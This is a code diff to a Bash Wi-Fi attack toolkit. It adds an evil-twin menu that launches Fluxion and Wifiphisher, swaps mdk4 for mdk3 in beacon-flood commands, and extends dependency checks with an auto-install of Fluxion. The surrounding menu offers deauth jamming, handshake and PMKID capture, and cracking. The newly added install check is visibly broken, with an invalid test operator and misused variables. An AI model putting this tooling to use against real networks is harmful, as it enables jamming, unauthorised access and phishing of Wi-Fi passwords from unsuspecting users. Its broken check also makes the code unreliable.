@@ -550,9 +550,8 @@ function menu(){
 
         echo -ne "${blueColour}[1] ${endColour}${grayColour}Handshake (WPA/WPA2 - PSK)${endColour}          ${blueColour}[12]${endColour}${grayColour} ChopChop Attack${endColour}\n"
         echo -ne "${blueColour}[2] ${endColour}${grayColour}Passive Handshake Capture${endColour}           ${blueColour}[13]${endColour}${grayColour} Mac Changer${endColour}\n"
-        echo -ne "${blueColour}[3]${endColour} ${grayColour}PMKID attack${endColour}                        ${blueColour}[14]${endColour}${grayColour} Quit${endColour}\n"
-
-        echo -ne "${blueColour}[4] ${endColour}${grayColour}Offline Cracking${endColour}\n"
+        echo -ne "${blueColour}[3]${endColour} ${grayColour}PMKID attack${endColour}                        ${blueColour}[14]${endColour}${grayColour} Evil_twin${endColour}\n"
+        echo -ne "${blueColour}[4] ${endColour}${grayColour}Offline Cracking${endColour}                    ${blueColour}[15]${endColour}${grayColour} Quit${endColour}\n"
 
         echo -ne "${blueColour}[5]${endColour} ${grayColour}Constant Deauth Attack (Jamming)${endColour}\n"
 		
@@ -654,7 +653,12 @@ function menu(){
                 ;;
 
 
-            14)
+            14)clear
+                evil_twin_options
+                sleep 1.5
+                ;;
+
+            15)
                 echo -ne "\n\t${greenColour}Bye, bye :)${endColour}\n"
                 tput cnorm; airmon-ng stop iw_wificraKmon > /dev/null 2>&1
 
@@ -958,14 +962,14 @@ function Beacon_Flood_attack_menu(){
             1)
                 echo -ne "${blueColour}[${endColour}${grayColour}*${endColour}${blueColour}]${endColour} ${grayColour}Pass the the name of the custom ssid file: ${endColour}" && read ssid_list;
       
-                xterm -hold -e "mdk4 iw_wificraKmon b -a -g -f $ssid_list" &
+                xterm -hold -e "mdk3 iw_wificraKmon b -a -g -f $ssid_list" &
                 break
                 menu
                 ;;
       
             2)
 
-                xterm -hold -e "mdk4 iw_wificraKmon b -a -w nta -m" &
+                xterm -hold -e "mdk3 iw_wificraKmon b -a -w nta -m" &
                 break
                 menu
                 ;;
@@ -1006,6 +1010,56 @@ function constant_deauth_attack(){
 
 }
 
+function evil_twin_options(){
+
+    opt_b=0
+
+    while [[ $opt_b -ne 3 ]];do
+        clear
+		all_banners_menu
+
+        echo -ne "\n${blueColour}[1]${endColour}${grayColour} Fluxion${endColour}\n"
+        echo -ne "${blueColour}[2]${endColour}${grayColour} Wifiphisher${endColour}\n"
+        echo -ne "${blueColour}[3]${endColour}${grayColour} Back${endColour}\n"
+		echo -ne "\n${yellowColour}[>]${endColour}${grayColour} Choose an option > ${endColour}" && read opc
+
+        case $opc in
+
+            1)
+      
+                pushd /opt/fluxion > /dev/null 2>&1
+                xterm -hold -e "cd /opt/fluxion/; /opt/fluxion/fluxion.sh" &
+                popd > /dev/null 2>&1
+                break
+                menu
+                ;;
+      
+            2)
+
+                xterm -hold -e "sudo wifiphisher" &
+
+
+                break
+                menu
+                ;;
+
+            3)
+
+                menu
+                ;;
+
+            *) 
+                echo -ne "${redColour}[!]${endColour} $opc Invalid Option\n"
+                ;;
+        esac
+    done
+
+
+
+}   
+
+
+
 function qhelppanel(){
 
 	echo -ne "${redColour} █     █░ ██▓  █████▒██▓ ▄████▄   ██▀███   ▄▄▄       ██ ▄█▀${endColour}\n"
@@ -1033,7 +1087,7 @@ function qhelppanel(){
 function dependencies(){
 
     ## checking dependencies
-    dependencies=(aircrack-ng macchanger xterm hcxdumptool crunch wash reaver)
+    dependencies=(aircrack-ng macchanger xterm hcxdumptool crunch wash reaver mdk3 mdk4 wifiphisher git php-cgi dhcpd lighttpd bc)
 
     echo -ne "${purpleColour}[*] ${endColour}${blueColour}Checking dependencies${endColour}\n"
 
@@ -1056,6 +1110,29 @@ function dependencies(){
 
     done
     clear
+
+    fluxion_check=$(find /opt/fluxion -name fluxion.sh 2>/dev/null | echo $!)
+
+    if [ fluxion_check -nq 0 ];then
+
+        echo -ne "${grayColour}\n[*] Installing Fluxion ... ${endColour}"
+
+        pushd /opt > /dev/null 2>&1
+
+        git clone https://www.github.com/FluxionNetwork/fluxion.git
+
+        popd > /dev/null 2>&1
+
+        echo -ne "${greenColour}\n[*] Fluxion Installed Successfully ${endColour}"
+
+
+
+    elif [ fluxion_check -eq 0 ];then
+
+        echo -ne "${blueColour}[*]${endColour}${grayColour} Fluxion ${endColour}${greenColour}(Installed)${endColour}"
+
+    fi
+
 }
 
 
